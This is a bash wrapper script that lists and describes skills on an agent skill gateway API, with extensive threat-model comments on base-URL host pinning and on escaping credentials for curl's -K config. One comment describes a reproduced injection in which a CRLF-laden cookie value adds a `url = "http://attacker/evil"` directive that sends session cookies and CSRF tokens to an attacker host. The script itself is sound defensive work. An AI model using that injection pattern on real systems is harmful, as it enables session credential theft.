#!/usr/bin/env bash
set -euo pipefail

# lg_agent_list.sh — Agent Skill Gateway discovery wrapper.
#
#   lg_agent_list.sh                    # list every skill visible to this token
#   lg_agent_list.sh describe <skillId> # show one skill's params schema + example
#
# `describe` is a thin GET /agent/skills?skillId=<id>.
#
# NOTE (2026-08-03): the list is NO LONGER filtered by the caller's granted
# scopes. Every entry carries a `granted` boolean instead — read that to know
# whether you can actually call it; ungranted entries also carry
# `presetsGrantingScope`. Pass `?granted=true` for the old filtered shape.
# Execution authorization is unchanged: /agent/skills/execute still checks
# scope on every call, so a visible skill is not necessarily a callable one.
# Every skill entry in the response carries a `params` schema array
# ({name,in,required,type,example?,aliases?}) and a curated or auto-derived
# `exampleInvocation` string for the new flat command-line form — read
# these directly from the JSON to see which keys a skill accepts before
# calling lg_agent_exec.sh.

# Default to official domain (D1, 2026-09-15: flipped from lg-data.cc to
# privora.cn -- both serve this API path with a direct 200/no-redirect as of
# the 2026-09-15 probe in docs/plans/2026-09-15-agent-exec-wrapper-destination-
# and-allowlist-hardening.md, so this flip is documentation/code alignment,
# not a behavior change for unset-env callers).
BASE_URL="${LG_AGENT_BASE_URL:-https://privora.cn}"

# ── _validate_base_url: destination validation (D1) ─────────────────────────
# Copy of lg_agent_exec.sh's function of the same name (LA#3: each script
# must run standalone on any third-party agent host, so this is duplicated
# rather than sourced from a shared file -- same pattern as
# _curl_config_escape below being duplicated across all three scripts).
# THREAT MODEL (read before touching this function):
#   Defends against: LG_AGENT_BASE_URL being MISCONFIGURED or injected by an
#   upstream layer (a stray env var, a copy-pasted wrong default, a
#   compromised CI variable) so that this script's bearer credential is sent
#   to a host nobody intended. One env var used to be able to redirect it
#   silently -- this closes that.
#   Does NOT defend against: an attacker who has already gained the ability
#   to set arbitrary environment variables for this process, or to write to
#   its filesystem. That attacker can just as easily delete the sibling
#   allowed-skills.txt referenced below (falling back to umbrella semantics)
#   or skip this script entirely and curl the endpoint directly with the
#   same token. This is not a privilege boundary.
#   The narrow-package host pin below has NO server-side counterpart: the
#   backend can validate a token's scope, but has no way to know or
#   constrain which host a client chose to send that token to.
_validate_base_url() {
  local url="$1" scheme rest authority host host_lc narrow_allowlist host_allowed allowed_host_raw allowed_host_lc allowed_hosts_noglob_was_set
  # Scheme match is case-insensitive (RFC 3986 3.1: scheme names are
  # case-insensitive) via bracket-expression globs -- NOT by lowercasing a
  # copy of $url and matching against that, and NOT via `shopt -s
  # nocasematch` (global interpreter state that would also loosen the
  # host/domain `case` statements further down, which must stay literal).
  # `rest` is derived by stripping through the first literal "://" (which
  # contains no letters, so this strip is itself case-invariant) rather
  # than the scheme-specific prefix, so a mixed-case scheme like "HTTPS://"
  # or "Https://" still yields the exact original-case remainder -- this
  # function never rewrites $url itself, so the URL curl actually receives
  # (via the untouched $BASE_URL in the caller) is never altered here.
  case "$url" in
    [Hh][Tt][Tt][Pp][Ss]://*) scheme="https" ;;
    [Hh][Tt][Tt][Pp]://*)     scheme="http" ;;
    *)
      echo "Error: LG_AGENT_BASE_URL must start with http:// or https:// (got: ${url})" >&2
      return 1
      ;;
  esac
  rest="${url#*://}"
  # authority = everything up to the first '/', '?', or '#' -- so a trailing
  # slash is tolerated: the host is extracted BEFORE that slash, never by
  # taking "everything after ://".
  authority="${rest%%/*}"
  authority="${authority%%\?*}"
  authority="${authority%%#*}"
  if [[ "$authority" == *"@"* ]]; then
    echo "Error: LG_AGENT_BASE_URL must not contain embedded credentials (user:pass@host)" >&2
    return 1
  fi
  if [[ "$authority" == \[* ]]; then
    host="${authority#\[}"
    host="${host%%]*}"
  else
    host="${authority%%:*}"
  fi
  # Portable lowercase (LA REVISE 2026-09-15): "${host,,}" is a bash 4+
  # parameter-expansion operator. On bash 3.2 (frozen as /bin/bash on
  # macOS for licensing reasons -- one of the "any third-party agent host"
  # targets LA#3 exists for) this is a PARSE-TIME "bad substitution" error,
  # which kills the whole script (every skill call), not just this check.
  # `tr` gives the same result on bash 3.2/4/5, dash, and ksh.
  host_lc="$(printf '%s' "$host" | tr '[:upper:]' '[:lower:]')"

  if [[ "$scheme" == "http" ]]; then
    case "$host_lc" in
      localhost|127.0.0.1|::1) : ;;
      *)
        echo "Error: LG_AGENT_BASE_URL uses plaintext http:// against a non-loopback host (${host}); use https://, or point at localhost/127.0.0.1/[::1] for local testing." >&2
        return 1
        ;;
    esac
  fi

  # Host pin, NARROW PACKAGES ONLY: only enforced when this script ships
  # with a sibling allowed-skills.txt. privora-cn-quant ships no such file
  # and documents self-hosting, so this branch must never fire for it.
  narrow_allowlist="$(dirname "${BASH_SOURCE[0]}")/allowed-skills.txt"
  if [[ -f "$narrow_allowlist" ]]; then
    case "$host_lc" in
      privora.cn|www.privora.cn|lg-data.cc) : ;;
      *)
        echo "Error: this package ships allowed-skills.txt (a narrow release) and pins LG_AGENT_BASE_URL's host to the official domains; got '${host}'. This is a packaging-honesty check, not a substitute for server-side authorization." >&2
        return 1
        ;;
    esac
  else
    # Umbrella host opt-in (LA-closed D-a/D-b/D-c,
    # docs/plans/2026-09-15-umbrella-custom-host-optin.md): umbrella
    # packages (privora-cn-quant) ship no allowed-skills.txt and document
    # self-hosting (mcp-server/README.md), so by default only the official
    # domains + loopback are accepted here. LG_AGENT_ALLOWED_HOSTS lets a
    # caller ADD specific extra hosts -- it can only enumerate, never widen
    # to "accept anything" (this is not a validation on/off switch; see the
    # wildcard rejection below).
    case "$host_lc" in
      privora.cn|www.privora.cn|lg-data.cc|localhost|127.0.0.1|::1) : ;;
      *)
        host_allowed=""
        # `for word in $VAR` (unquoted) is subject to BOTH word-splitting AND
        # pathname expansion for '*', '?', and '[...]' character classes --
        # an entry of literally "*" (or "?", or "[abc]") would otherwise be
        # silently replaced by real filenames from the process's CWD before
        # it ever reaches the skip-wildcards check below, which
        # single-handedly defeats "no wildcards, ever" the moment CWD
        # happens to contain a file matching the pattern (verified
        # empirically: "*", "?", and "[wxyz]" ALL expand against a matching
        # real filename when run unguarded -- not just "*"). Suppressing
        # pathname expansion (glob) for the duration of this split closes
        # all three, while keeping the same whitespace-splitting semantics
        # as before.
        #
        # Tilde expansion ("~") and command-substitution syntax embedded in
        # the VALUE of a variable ("$(id)", a literal backtick pair) are
        # separate mechanisms from pathname expansion and are NOT affected
        # by `set -f` -- but they are also not a risk here: expanding
        # ${LG_AGENT_ALLOWED_HOSTS:-} does not re-parse its VALUE for tilde
        # or command substitution (verified empirically: both stay
        # byte-for-byte literal in a `for word in $VAR` context, so they
        # simply fail the exact-match comparison below like any other
        # non-matching string). See H4c/T-glob-metachars in
        # test/lg-agent-wrapper-destination-guard.test.js, which pins this
        # exact combination (pathname expansion suppressed here + the
        # comparison staying quoted below) as its own property, rather than
        # trusting the two mechanisms to keep agreeing by coincidence --
        # either one alone regressing would silently reopen this.
        #
        # Save/restore noglob explicitly (rather than assuming it starts
        # unset). The one real path that could otherwise skip the `set +f`
        # restore below is NOT a `return 1` inside this loop (there is none
        # -- rejection only ever happens once, after the loop) -- it is the
        # `allowed_host_lc="$(...)"` command-substitution assignment a few
        # lines down failing under `set -euo pipefail` (verified
        # empirically: `x="$(false)"` under `set -e` aborts the enclosing
        # function immediately, skipping everything after it, including
        # `set +f`). The `|| allowed_host_lc="$allowed_host_raw"` fallback on
        # that line closes this structurally: the assignment can no longer
        # report a non-zero status to `set -e` (verified: `x="$(false)" ||
        # x="fallback"` does not trip `set -e`), so `set +f` below is now
        # unconditionally reached on every iteration of this loop.
        allowed_hosts_noglob_was_set=""
        case "$-" in *f*) allowed_hosts_noglob_was_set=1 ;; esac
        set -f
        for allowed_host_raw in ${LG_AGENT_ALLOWED_HOSTS:-}; do
          # No wildcards, ever: an entry containing '*', or an empty entry
          # (stray whitespace / unset var), is invalid and is SKIPPED --
          # never treated as "match everything". LG_AGENT_ALLOWED_HOSTS="*"
          # must still reject every non-official host, not silently reopen
          # the umbrella's old "any syntactically valid https host" hole.
          # ('?' and '[...]' entries are NOT skipped here -- they fall
          # through to the quoted comparison below, which rejects them as
          # ordinary literal strings; see the comment above this loop for
          # why that is safe.)
          case "$allowed_host_raw" in
            ''|*'*'*) continue ;;
          esac
          # Same portable-lowercase mechanism as host_lc above (no
          # bash-4-only ${var,,}) -- comparison is case-insensitive by
          # design, via a quoted `==` (literal string compare, NOT a glob
          # match -- an unquoted RHS here would let a wildcard entry that
          # slipped past the skip above match anything).
          allowed_host_lc="$(printf '%s' "$allowed_host_raw" | tr '[:upper:]' '[:lower:]')" || allowed_host_lc="$allowed_host_raw"
          if [[ "$host_lc" == "$allowed_host_lc" ]]; then
            host_allowed=1
            break
          fi
        done
        [[ -n "$allowed_hosts_noglob_was_set" ]] || set +f
        if [[ -z "$host_allowed" ]]; then
          echo "Error: LG_AGENT_BASE_URL host '${host}' is not an official domain (privora.cn, www.privora.cn, lg-data.cc) or loopback (localhost, 127.0.0.1, [::1]); set LG_AGENT_ALLOWED_HOSTS=\"${host}\" (whitespace-separated, exact match, case-insensitive, no wildcards) to opt in for a self-hosted deployment." >&2
          return 1
        fi
        ;;
    esac
  fi
  return 0
}

_validate_base_url "$BASE_URL" || exit 1

: "${LG_AGENT_TOKEN:?LG_AGENT_TOKEN is required}"

# ── _curl_config_escape: safe embedding of an untrusted value into curl's
# -K config mini-language (found in #1410's own LA exit review) ────────────────────────────────────────
# Copy of lg_agent_exec.sh's function of the same name (LA#3: each script
# must run standalone on any third-party agent host, so this is duplicated
# rather than sourced from a shared file -- same pattern as
# _validate_base_url already being duplicated across these scripts).
# THREAT MODEL: `-K -` reads a small curl-specific config LANGUAGE off
# stdin, not raw bytes. A `header = "..."` line is a double-quoted STRING
# in that language, and curl's own config parser recognizes `\"` and `\\`
# as escapes inside it -- so splicing an untrusted value into that string
# with ZERO escaping lets the value's own `"`, `\`, or embedded CR/LF
# characters break out of the intended field and inject a NEW config
# directive. LA reproduced this directly against the real
# lg_agent_approval.sh (raw socket capture, not a mockup):
#   - a cookie value containing `"` silently TRUNCATES at the quote --
#     wrong data reaches the server with no error;
#   - a cookie value containing CRLF + `header = "X-Injected: pwned"` gets
#     that header ACTUALLY INJECTED into the real request;
#   - a cookie value containing CRLF + `url = "http://attacker/evil"`
#     makes curl issue a SECOND request to that attacker-chosen URL,
#     carrying the real Cookie and X-CSRF-Token -- session credential
#     exfiltration to an address the attacker picked, not this script's
#     caller.
# This is the SAME primitive as #1410's trap-reparse bug in a different
# spot: an untrusted string is spliced into a mini-language stream that is
# later RE-PARSED by its consumer (there: the shell parsing a trap string
# at fire time; here: curl's own `-K` config parser). LG_AGENT_TOKEN /
# LG_AGENT_COOKIE_HEADER / LG_AGENT_CSRF_TOKEN are all documented as
# caller-supplied arbitrary strings with only a non-empty check -- no
# format validation -- so all three routes reach this, in all three
# scripts (#1408's lesson applies unmodified: fixing only one script's
# copy is not a fix).
# THE FIX (LA-verified empirically, both parts required):
#   1. REJECT (never escape) a value containing CR or LF outright. Even a
#      correctly backslash-escaped newline BYTE still splits the config
#      stream into two lines and starts a new directive when curl parses
#      it -- escaping cannot neutralize a raw newline in this
#      mini-language, only rejecting the value can.
#   2. Escape ORDER MATTERS: backslash first (`\` -> `\\`), THEN quote
#      (`"` -> `\"`). curl's own `-K` quoted-string parser round-trips
#      both escapes byte-for-byte ONLY in this order -- the reverse order
#      reintroduces a way to forge a `\"` sequence that curl decodes as an
#      unescaped, string-terminating quote (verified).
# Prints the escaped value on stdout on success. On a CR/LF value, prints
# an error to stderr and returns 1 -- EVERY caller MUST check this exit
# status BEFORE the resulting `-K -` pipeline is ever started (checking it
# only via `set -o pipefail` on the pipeline itself is NOT enough: an
# empty/short stdin still lets curl run using its OTHER, non-piped
# arguments and possibly succeed, silently downgrading to an
# under-authenticated request instead of failing loudly).
_curl_config_escape() {
  local v="$1"
  if [[ "$v" == *$'\r'* || "$v" == *$'\n'* ]]; then
    echo "Error: this credential value contains a CR or LF byte, which cannot be safely embedded in curl's -K config stream -- refusing rather than risk a truncated or injected request." >&2
    return 1
  fi
  v="${v//\\/\\\\}"
  v="${v//\"/\\\"}"
  printf '%s' "$v"
}

# Escaped/validated ONCE, in the main shell, BEFORE `_auth_curl_config` is
# ever piped into curl: if this fails, `exit 1` here aborts the WHOLE
# script. Doing the check only on the far side of the pipe risks
# `set -o pipefail` masking it -- an empty/short stdin still lets curl run
# with its other, non-piped arguments and possibly exit 0.
LG_AGENT_TOKEN_ESC="$(_curl_config_escape "$LG_AGENT_TOKEN")" || exit 1

usage() {
  echo "Usage:" >&2
  echo "  $0                      # list all skills visible to this token" >&2
  echo "  $0 describe <skillId>   # show one skill's params schema + example" >&2
  exit 1
}

# ── _auth_curl_config: Authorization header via curl's stdin config (#1410, B) ──
# THREAT MODEL: `-H "Authorization: Bearer ${LG_AGENT_TOKEN}"` puts the
# bearer token in THIS process's own argv. Reading another process's argv on
# the same host (Linux /proc/*/cmdline; a Windows process listing) needs no
# elevation and no write capability at all -- the bar is just "any other
# local principal", which is STRICTLY LOWER than "can already set this
# process's env vars or write its filesystem" (the bar #1408's
# destination-validation disclaimer is about, in _validate_base_url above).
# That disclaimer does not cover this; do not cite it here. Piping
# `header = "Authorization: Bearer ..."` into `curl -K -` keeps the token out
# of argv entirely -- it travels over the pipe as bytes curl reads on its
# OWN stdin as configuration, never as a command-line argument. `-K` (config
# from stdin) is old enough to work on every curl version this script
# targets (LA#3), unlike `--expand-header` (curl >= 8.3, #1410 design doc's
# path A, deferred) -- no feature probe needed.
# `printf` below MUST be the BARE builtin -- never `command printf`, never
# an absolute path like `/usr/bin/printf`. A bare `printf` resolves to
# bash's (and dash's) own BUILTIN on every host tested here (`type -a
# printf` shows both a builtin and `/usr/bin/printf` present; `bash -x`
# confirms the bare call forks no child process), so the token text never
# becomes any process's argv, including printf's own. `command printf` or a
# hardcoded path would fork a real external process and put the token right
# back into THAT process's argv -- exactly what this change exists to
# prevent. A grep guard in the test suite fails if this script regresses to
# `command printf` or an absolute-path printf.
_auth_curl_config() {
  printf 'header = "Authorization: Bearer %s"\n' "$LG_AGENT_TOKEN_ESC"
}

if [[ $# -eq 0 ]]; then
  _auth_curl_config | curl -sS -K - "${BASE_URL}/agent/skills" \
    -H "Accept: application/json"
  exit 0
fi

if [[ "$1" != "describe" ]]; then
  usage
fi
if [[ $# -lt 2 ]]; then
  usage
fi
SKILL_ID="$2"

_auth_curl_config | curl -sS -K - "${BASE_URL}/agent/skills?skillId=$(printf '%s' "$SKILL_ID" | sed -e 's/ /%20/g')" \
  -H "Accept: application/json"
